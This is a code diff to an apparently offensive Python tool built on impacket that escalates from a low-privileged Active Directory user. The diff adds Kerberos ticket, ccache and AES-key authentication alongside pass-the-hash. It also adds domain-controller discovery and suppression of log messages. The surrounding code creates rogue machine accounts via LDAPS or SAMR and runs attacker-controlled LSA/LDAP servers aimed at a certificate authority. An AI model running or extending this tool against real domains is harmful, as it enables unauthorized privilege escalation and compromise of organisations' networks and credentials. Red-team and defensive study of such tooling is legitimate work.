@@ -16,7 +16,8 @@ from impacket.dcerpc.v5.dtypes import DWORD, LPWSTR, NULL, PBYTE, RPC_SID, ULONG
 from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
 from impacket.dcerpc.v5.nrpc import checkNullString
 from impacket.dcerpc.v5.rpcrt import (
-    DCERPCServer, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, TypeSerialization1,
+    DCERPCServer, RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
+    TypeSerialization1,
 )
 from impacket.krb5 import constants
 from impacket.krb5.asn1 import (
@@ -177,17 +178,27 @@ def detect_ip(dc_ip):
         s.connect((dc_ip, 445)); ip = s.getsockname()[0]; s.close(); return ip
     except: return None
 
-def ldap_connect(dc_ip, domain, username, password, lmhash, nthash, base_dn, use_ldap=False):
+def ldap_connect(dc_ip, domain, username, password, lmhash, nthash, base_dn,
+                 use_ldap=False, use_kerberos=False, aes_key='', dc_host=''):
     scheme = "ldap" if use_ldap else "ldaps"
+    target = dc_host if (use_kerberos and dc_host) else dc_ip
     try:
-        conn = impacket_ldap.LDAPConnection(f"{scheme}://{dc_ip}", base_dn, dc_ip)
-        conn.login(username, password, domain, lmhash, nthash)
+        conn = impacket_ldap.LDAPConnection(f"{scheme}://{target}", base_dn, dc_ip)
+        if use_kerberos:
+            conn.kerberosLogin(username, password, domain, lmhash, nthash,
+                               aesKey=aes_key, kdcHost=dc_ip, useCache=True)
+        else:
+            conn.login(username, password, domain, lmhash, nthash)
         return conn
     except Exception:
         if not use_ldap:
             try:
-                conn = impacket_ldap.LDAPConnection(f"ldap://{dc_ip}", base_dn, dc_ip)
-                conn.login(username, password, domain, lmhash, nthash)
+                conn = impacket_ldap.LDAPConnection(f"ldap://{target}", base_dn, dc_ip)
+                if use_kerberos:
+                    conn.kerberosLogin(username, password, domain, lmhash, nthash,
+                                       aesKey=aes_key, kdcHost=dc_ip, useCache=True)
+                else:
+                    conn.login(username, password, domain, lmhash, nthash)
                 return conn
             except Exception:
                 pass
@@ -786,12 +797,20 @@ def create_computer_ldaps(conn, dn, comp_name, comp_pass):
              "unicodePwd": f'"{comp_pass}"'.encode("utf-16-le")}
     conn.add(comp_dn, ["top", "person", "organizationalPerson", "user", "computer"], attrs)
 
-def create_computer_samr(dc_ip, domain, username, password, lmhash, nthash, comp_name, comp_pass):
+def create_computer_samr(dc_ip, domain, username, password, lmhash, nthash,
+                         comp_name, comp_pass, use_kerberos=False, aes_key=''):
     binding = epm.hept_map(dc_ip, samr.MSRPC_UUID_SAMR, protocol='ncacn_np')
     rpctransport = transport.DCERPCTransportFactory(binding)
     rpctransport.setRemoteHost(dc_ip)
-    rpctransport.set_credentials(username, password, domain, lmhash, nthash)
-    dce = rpctransport.get_dce_rpc(); dce.connect(); dce.bind(samr.MSRPC_UUID_SAMR)
+    if use_kerberos:
+        rpctransport.set_credentials(username, password, domain, aesKey=aes_key)
+        rpctransport.set_kerberos(True, dc_ip)
+    else:
+        rpctransport.set_credentials(username, password, domain, lmhash, nthash)
+    dce = rpctransport.get_dce_rpc()
+    if use_kerberos:
+        dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
+    dce.connect(); dce.bind(samr.MSRPC_UUID_SAMR)
     r = samr.hSamrConnect5(dce, '\\\\%s\x00' % dc_ip,
         samr.SAM_SERVER_ENUMERATE_DOMAINS | samr.SAM_SERVER_LOOKUP_DOMAIN)
     servHandle = r['ServerHandle']
@@ -822,11 +841,13 @@ def create_computer_samr(dc_ip, domain, username, password, lmhash, nthash, comp
     samr.hSamrCloseHandle(dce, servHandle)
     dce.disconnect()
 
-def create_computer(conn, dc_ip, domain, username, password, lmhash, nthash, comp_name, comp_pass, dn):
+def create_computer(conn, dc_ip, domain, username, password, lmhash, nthash,
+                    comp_name, comp_pass, dn, use_kerberos=False, aes_key=''):
     try:
         create_computer_ldaps(conn, dn, comp_name, comp_pass)
     except Exception:
-        create_computer_samr(dc_ip, domain, username, password, lmhash, nthash, comp_name, comp_pass)
+        create_computer_samr(dc_ip, domain, username, password, lmhash, nthash,
+                             comp_name, comp_pass, use_kerberos=use_kerberos, aes_key=aes_key)
 
 
 def port_ok(h, p, t=1.0):
@@ -839,13 +860,23 @@ def main():
         epilog="""examples:
   %(prog)s -d playground.local -u lowpriv -p Password1234 --dc-ip 192.168.209.157
   %(prog)s -d corp.local -u user -p pass --dc-ip 10.0.0.1 --ca-ip 10.0.0.2
-  %(prog)s -d corp.local -u user -p pass --dc-ip 10.0.0.1 --target-san SERVER01$""")
+  %(prog)s -d corp.local -u user -H :31d6cfe0d16ae931b73c59d7e0c089c0 --dc-ip 10.0.0.1
+  %(prog)s -d corp.local -u user -k --ccache user.ccache --dc-ip 10.0.0.1
+  %(prog)s -d corp.local -k --ccache admin.ccache --dc-ip 10.0.0.1
+  %(prog)s -d corp.local -u user --aes-key 4a3b5c... --dc-ip 10.0.0.1""")
     p.add_argument("-d", "--domain", required=True, help="Domain DNS name")
-    p.add_argument("-u", "--username", required=True, help="Low-priv domain user")
-    auth = p.add_mutually_exclusive_group(required=True)
+    p.add_argument("-u", "--username", default="", help="Low-priv domain user (optional with --ccache)")
+    auth = p.add_mutually_exclusive_group()
     auth.add_argument("-p", "--password", help="User password")
     auth.add_argument("-H", "--hashes", help="NTLM hash (LM:NT or :NT)", metavar="[LM:]NT")
+    p.add_argument("-k", "--kerberos", action="store_true",
+                   help="Use Kerberos authentication (ccache via KRB5CCNAME or --ccache)")
+    p.add_argument("--ccache", default=None,
+                   help="Path to ccache file (sets KRB5CCNAME, implies -k)")
+    p.add_argument("--aes-key", metavar="HEXKEY", default=None,
+                   help="AES128/256 key for Kerberos auth (implies -k)")
     p.add_argument("--dc-ip", required=True, help="Domain Controller IP")
+    p.add_argument("--dc-host", help="Domain Controller FQDN (for Kerberos SPN; auto-discovered if omitted)")
     p.add_argument("--ca-ip", help="CA IP (optional)")
     p.add_argument("--ca", help="CA name (optional)")
     p.add_argument("--listener", help="Attacker IP for rogue servers (default: auto-detected)", metavar="IP")
@@ -868,15 +899,38 @@ def main():
         parts = args.hashes.split(":")
         lmhash = parts[0] if len(parts) > 1 else ""
         nthash = parts[-1]
+
+    use_kerberos = args.kerberos or bool(args.ccache) or bool(args.aes_key)
+    aes_key = args.aes_key or ""
+    if args.ccache:
+        os.environ["KRB5CCNAME"] = args.ccache
+    if not use_kerberos and not password and not nthash:
+        print("[!] No authentication provided. Use -p, -H, -k, --ccache, or --aes-key"); sys.exit(1)
+    if args.aes_key and not user:
+        print("[!] --aes-key requires -u/--username"); sys.exit(1)
+
     ca_ip = args.ca_ip
     nb = dns2nb(domain); dn = dns2dn(domain)
 
     logging.basicConfig(level=logging.CRITICAL, format="%(message)s")
+    class _Suppress(logging.Filter):
+        def filter(self, rec): return "CCache file is not found" not in rec.getMessage()
     for ln in ["impacket", "impacket.smbserver", "impacket.dcerpc", "rogue_lsa", "rogue_ldap"]:
-        logging.getLogger(ln).setLevel(logging.CRITICAL)
+        lg = logging.getLogger(ln); lg.setLevel(logging.CRITICAL); lg.addFilter(_Suppress())
+
+    dc_host = args.dc_host or ""
+    if use_kerberos and not dc_host:
+        try:
+            import dns.resolver
+            r = dns.resolver.Resolver(configure=False); r.nameservers = [dc_ip]
+            ans = r.resolve(f"_ldap._tcp.dc._msdcs.{domain}", "SRV")
+            dc_host = str(list(ans)[0].target).rstrip(".")
+        except Exception:
+            dc_host = ""
 
     print(f"[*] Connecting to {'LDAP' if args.use_ldap else 'LDAPS'}")
-    conn = ldap_connect(dc_ip, domain, user, password, lmhash, nthash, dn, args.use_ldap)
+    conn = ldap_connect(dc_ip, domain, user, password, lmhash, nthash, dn,
+                        args.use_ldap, use_kerberos, aes_key, dc_host)
     if not conn: print("[!] Cannot connect to LDAP"); sys.exit(1)
 
     print("[*] Detecting infrastructure")
@@ -938,7 +992,8 @@ def main():
         comp_pass = "CG" + secrets.token_hex(10) + "Aa1"
         print(f"[*] Creating computer: {comp_name}")
         try:
-            create_computer(conn, dc_ip, domain, user, password, lmhash, nthash, comp_name, comp_pass, dn)
+            create_computer(conn, dc_ip, domain, user, password, lmhash, nthash,
+                           comp_name, comp_pass, dn, use_kerberos, aes_key)
         except Exception as e:
             print(f"[!] Computer creation failed: {e}"); sys.exit(1)
         comp_hash = compute_nthash(comp_pass)
